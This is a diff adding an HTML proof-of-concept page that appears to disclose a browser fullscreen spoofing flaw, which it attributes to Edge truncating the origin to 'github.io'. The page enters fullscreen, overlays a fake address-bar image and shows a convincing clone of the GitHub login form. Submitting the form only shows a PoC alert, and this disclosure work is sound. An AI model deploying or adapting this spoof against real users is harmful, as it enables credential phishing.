@@ -1,0 +1,559 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, viewport-fit=cover"
+    />
+    <title>Sign in to GitHub · GitHub</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      html,
+      body {
+        width: 100%;
+        min-height: 100%;
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica,
+          Arial, sans-serif;
+        background: #ffffff;
+        color: #24292f;
+        font-size: 14px;
+      }
+
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        flex-direction: column;
+      }
+
+      /* --- State 1: pemicu --- */
+      .trigger-wrap {
+        position: fixed;
+        inset: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        gap: 16px;
+        background: #f6f8fa;
+        padding: 24px;
+      }
+
+      .trigger-btn {
+        padding: 12px 24px;
+        font-size: 16px;
+        font-weight: 600;
+        border-radius: 6px;
+        background-color: #1f883d;
+        color: #fff;
+        border: 1px solid rgba(27, 31, 36, 0.15);
+        cursor: pointer;
+      }
+
+      .trigger-btn:hover {
+        background-color: #1a7f37;
+      }
+
+      .trigger-note {
+        font-size: 12px;
+        color: #57606a;
+        max-width: 480px;
+        text-align: center;
+        line-height: 1.5;
+      }
+
+      /* --- Panel perbandingan Chrome vs Edge --- */
+      .compare-box {
+        margin-top: 8px;
+        width: 100%;
+        max-width: 520px;
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+        font-size: 13px;
+        line-height: 1.5;
+      }
+
+      .compare-row {
+        display: flex;
+        gap: 8px;
+        padding: 10px 14px;
+        border-radius: 6px;
+        border: 1px solid #d0d7de;
+        background: #ffffff;
+        text-align: left;
+      }
+
+      .compare-row.secure {
+        border-left: 4px solid #1f883d;
+      }
+
+      .compare-row.vuln {
+        border-left: 4px solid #cf222e;
+      }
+
+      .compare-row .label {
+        font-weight: 600;
+        color: #24292f;
+        flex-shrink: 0;
+      }
+
+      .compare-row.secure .label {
+        color: #1f883d;
+      }
+
+      .compare-row.vuln .label {
+        color: #cf222e;
+      }
+
+      .compare-row .value {
+        color: #57606a;
+      }
+
+      .compare-row code {
+        font-family:
+          ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
+        font-size: 12px;
+        background: #f6f8fa;
+        padding: 1px 6px;
+        border-radius: 4px;
+        color: #24292f;
+      }
+
+      /* --- State 2: konten penuh fullscreen --- */
+      #spoof-root {
+        display: none;
+        width: 100%;
+        min-height: 100vh;
+        position: relative;
+        background: #ffffff;
+      }
+
+      #spoof-root.active {
+        display: block;
+      }
+
+      /*
+     * ============================================================
+     *  FAKE BROWSER CHROME
+     * ------------------------------------------------------------
+     *  --ab-offset : jarak (gap) antara tepi atas viewport dengan
+     *                address bar palsu. Atur di sini.
+     *  --ab-height : tinggi total fake-chrome (diisi otomatis oleh
+     *                JS via ResizeObserver, termasuk safe-area iOS).
+     * ============================================================
+     */
+      :root {
+        --ab-scale: 1;
+        --ab-height: 120px; /* fallback sebelum JS jalan */
+        --ab-bg: #202124;
+        --ab-offset: 36px; /* ← GAP di atas address bar palsu */
+      }
+
+      .fake-chrome {
+        position: fixed;
+        top: var(--ab-offset); /* ← sebelumnya: top: 0 */
+        left: 0;
+        width: calc(100% * var(--ab-scale));
+        z-index: 99999;
+        line-height: 0;
+        background: var(--ab-bg);
+        border-bottom: 1px solid #000;
+        overflow: hidden;
+        /* hormati notch / dynamic island */
+        padding-top: env(safe-area-inset-top, 0px);
+        padding-left: env(safe-area-inset-left, 0px);
+        padding-right: env(safe-area-inset-right, 0px);
+      }
+
+      .fake-chrome img {
+        display: block;
+        width: 100%;
+        height: auto; /* <— kunci: rasio asli dipertahankan */
+        user-select: none;
+        -webkit-user-drag: none;
+        pointer-events: none;
+      }
+
+      /* --- Konten GitHub login --- */
+      .github-main {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        /* padding atas = offset + tinggi fake-chrome + buffer */
+        padding: calc(var(--ab-offset) + var(--ab-height) + 32px) 16px 48px;
+        background: #ffffff;
+      }
+
+      .github-logo {
+        color: #24292f;
+        margin-bottom: 24px;
+        line-height: 0;
+      }
+
+      .github-logo svg {
+        width: 48px;
+        height: 48px;
+        fill: currentColor;
+      }
+
+      .github-h1 {
+        font-size: 24px;
+        font-weight: 300;
+        letter-spacing: -0.5px;
+        margin-bottom: 16px;
+        color: #24292f;
+        text-align: center;
+      }
+
+      .github-card {
+        width: 100%;
+        max-width: 340px;
+        background: #f6f8fa;
+        border: 1px solid #d0d7de;
+        border-radius: 6px;
+        padding: 16px;
+      }
+
+      .github-label {
+        display: block;
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 6px;
+        margin-top: 14px;
+        color: #24292f;
+      }
+
+      .github-label:first-of-type {
+        margin-top: 0;
+      }
+
+      .github-input {
+        width: 100%;
+        padding: 5px 12px;
+        font-size: 14px;
+        line-height: 20px;
+        color: #24292f;
+        background: #ffffff;
+        border: 1px solid #d0d7de;
+        border-radius: 6px;
+        outline: none;
+        height: 32px;
+      }
+
+      .github-input:focus {
+        border-color: #0969da;
+        box-shadow: 0 0 0 3px rgba(9, 105, 218, 0.3);
+      }
+
+      .github-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 14px;
+      }
+
+      .github-link {
+        color: #0969da;
+        text-decoration: none;
+        font-size: 12px;
+      }
+
+      .github-link:hover {
+        text-decoration: underline;
+      }
+
+      .github-btn {
+        width: 100%;
+        margin-top: 16px;
+        padding: 5px 16px;
+        font-size: 14px;
+        font-weight: 600;
+        line-height: 20px;
+        color: #ffffff;
+        background: #1f883d;
+        border: 1px solid rgba(27, 31, 36, 0.15);
+        border-radius: 6px;
+        cursor: pointer;
+        height: 32px;
+      }
+
+      .github-btn:hover {
+        background: #1a7f37;
+      }
+
+      .github-alt {
+        width: 100%;
+        max-width: 340px;
+        margin-top: 16px;
+        padding: 16px;
+        border: 1px solid #d0d7de;
+        border-radius: 6px;
+        text-align: center;
+        font-size: 14px;
+      }
+
+      .github-alt a {
+        color: #0969da;
+        text-decoration: none;
+      }
+
+      .github-alt a:hover {
+        text-decoration: underline;
+      }
+
+      .github-footer {
+        padding: 16px;
+        display: flex;
+        justify-content: center;
+        gap: 16px;
+        font-size: 12px;
+        color: #57606a;
+        flex-wrap: wrap;
+      }
+
+      .github-footer a {
+        color: #0969da;
+        text-decoration: none;
+      }
+
+      .github-footer a:hover {
+        text-decoration: underline;
+      }
+
+      @media (max-width: 480px) {
+        .github-h1 {
+          font-size: 20px;
+        }
+      }
+
+      /*
+       * ============================================================
+       *  MOBILE-ONLY: bikin fake chrome tampak seperti address bar
+       *  asli di HP (full-bleed, notch-safe, tajam, ada shadow).
+       * ============================================================
+       */
+      @media (max-width: 768px), (pointer: coarse) {
+        .fake-chrome {
+          /* Pastikan full-bleed walau --ab-scale diubah */
+          width: 100%;
+          left: 0;
+          right: 0;
+          /* Rasio gambar dipertahankan; tinggi baris ditentukan gambar */
+          line-height: 0;
+          /* Bayangan tipis meniru address bar native */
+          box-shadow:
+            0 1px 0 rgba(0, 0, 0, 0.45),
+            0 2px 8px rgba(0, 0, 0, 0.25);
+          /* Hindari 1px gap di beberapa browser mobile */
+          border-bottom: none;
+        }
+
+        .fake-chrome img {
+          width: 100%;
+          height: auto;
+          /* Render lebih tajam saat di-scale di layar retina */
+          image-rendering: -webkit-optimize-contrast;
+          -webkit-backface-visibility: hidden;
+          backface-visibility: hidden;
+          /* Cegah seleksi / long-press menu */
+          -webkit-touch-callout: none;
+          -webkit-user-select: none;
+          user-select: none;
+        }
+
+        /* Konten utama sedikit lebih rapat, tipografi mobile */
+        .github-main {
+          padding: calc(var(--ab-offset) + var(--ab-height) + 20px) 16px 40px;
+        }
+
+        .github-card,
+        .github-alt {
+          max-width: 100%;
+        }
+      }
+
+      /* iOS: pastikan status bar transparan saat fullscreen */
+      @supports (padding: env(safe-area-inset-top)) {
+        .fake-chrome {
+          padding-top: env(safe-area-inset-top, 0px);
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <!-- ===== State 1: pemicu (harus ada user gesture) ===== -->
+    <div class="trigger-wrap" id="trigger-wrap">
+      <button class="trigger-btn" onclick="enterFullscreenSpoof()">
+        Sign in with GitHub
+      </button>
+
+      <p class="trigger-note">
+        Click the button to simulate a scenario where a victim opens a phishing
+        link that mimics the GitHub login page, then enters fullscreen mode. The
+        browser's fullscreen notification is the only remaining origin signal
+        the user can rely on.
+      </p>
+
+      <div class="compare-box">
+        <div class="compare-row secure">
+          <span class="label">Secure (Chrome):</span>
+          <span class="value">
+            displays the full URL &mdash;
+            <code>nuribnuu.github.io</code>
+          </span>
+        </div>
+        <div class="compare-row vuln">
+          <span class="label">Vulnerable (Edge):</span>
+          <span class="value">
+            truncates the URL to &mdash;
+            <code>github.io</code>
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== State 2: konten spoofing (muncul setelah fullscreen) ===== -->
+    <div id="spoof-root">
+      <!-- Fake browser chrome (address bar) di atas -->
+      <div class="fake-chrome" aria-hidden="true">
+        <img id="fake-chrome-img" src="addressbar-github.jpg" alt="" />
+      </div>
+
+      <!-- Konten login GitHub -->
+      <main class="github-main">
+        <div class="github-logo" aria-hidden="true">
+          <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+            <path
+              fill-rule="evenodd"
+              d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"
+            />
+          </svg>
+        </div>
+        <h1 class="github-h1">Sign in to GitHub</h1>
+
+        <form
+          class="github-card"
+          onsubmit="
+            event.preventDefault();
+            alert('Fake GitHub login — this is a PoC.');
+          "
+        >
+          <label class="github-label" for="gh-username"
+            >Username or email address</label
+          >
+          <input
+            class="github-input"
+            id="gh-username"
+            type="text"
+            autocomplete="username"
+          />
+
+          <div class="github-row">
+            <label class="github-label" for="gh-password" style="margin: 0"
+              >Password</label
+            >
+            <a class="github-link" href="#" onclick="event.preventDefault()"
+              >Forgot password?</a
+            >
+          </div>
+          <input
+            class="github-input"
+            id="gh-password"
+            type="password"
+            autocomplete="current-password"
+            style="margin-top: 6px"
+          />
+
+          <button class="github-btn" type="submit">Sign in</button>
+        </form>
+
+        <div class="github-alt">
+          New to GitHub?
+          <a href="#" onclick="event.preventDefault()">Create an account</a>
+        </div>
+
+        <footer class="github-footer">
+          <a href="#" onclick="event.preventDefault()">Terms</a>
+          <a href="#" onclick="event.preventDefault()">Privacy</a>
+          <a href="#" onclick="event.preventDefault()">Docs</a>
+          <a href="#" onclick="event.preventDefault()"
+            >Contact GitHub Support</a
+          >
+        </footer>
+      </main>
+    </div>
+
+    <script>
+      const triggerWrap = document.getElementById("trigger-wrap");
+      const spoofRoot = document.getElementById("spoof-root");
+      const fakeChrome = document.querySelector(".fake-chrome");
+
+      // ---- Sinkronisasi tinggi fake chrome ke CSS variable ----
+      // Diukur dari elemen .fake-chrome (bukan img) supaya
+      // padding safe-area iOS (notch) ikut terhitung.
+      function syncChromeHeight() {
+        if (!fakeChrome) return;
+        const h = fakeChrome.getBoundingClientRect().height;
+        if (h > 0) {
+          document.documentElement.style.setProperty("--ab-height", h + "px");
+        }
+      }
+
+      const fakeChromeImg = document.getElementById("fake-chrome-img");
+      fakeChromeImg.addEventListener("load", syncChromeHeight);
+      window.addEventListener("resize", syncChromeHeight);
+      // Mobile: rotasi layar kadang butuh delay agar layout stabil
+      window.addEventListener("orientationchange", () => {
+        setTimeout(syncChromeHeight, 150);
+      });
+      // Lebih andal: pantau perubahan ukuran elemen fake-chrome
+      if (window.ResizeObserver) {
+        new ResizeObserver(syncChromeHeight).observe(fakeChrome);
+      }
+      // Kalau gambar sudah ke-cache sebelum listener terpasang
+      if (fakeChromeImg.complete) syncChromeHeight();
+
+      // ---- Fullscreen ----
+      function requestFullscreen(el) {
+        if (el.requestFullscreen) return el.requestFullscreen();
+        if (el.webkitRequestFullscreen) return el.webkitRequestFullscreen();
+        if (el.msRequestFullscreen) return el.msRequestFullscreen();
+        return Promise.reject(new Error("Fullscreen API not supported"));
+      }
+
+      function enterFullscreenSpoof() {
+        const el = document.documentElement;
+        requestFullscreen(el)
+          .then(() => {
+            triggerWrap.style.display = "none";
+            spoofRoot.classList.add("active");
+            requestAnimationFrame(syncChromeHeight);
+          })
+          .catch((err) => {
+            console.warn("Fullscreen request rejected:", err);
+            alert(
+              "Fullscreen ditolak oleh browser. PoC tidak bisa dijalankan.",
+            );
+          });
+      }
+
+      document.addEventListener("fullscreenchange", () => {
+        if (!document.fullscreenElement) {
+          spoofRoot.classList.remove("active");
+          triggerWrap.style.display = "flex";
+        }
+      });
+    </script>
+  </body>
+</html>
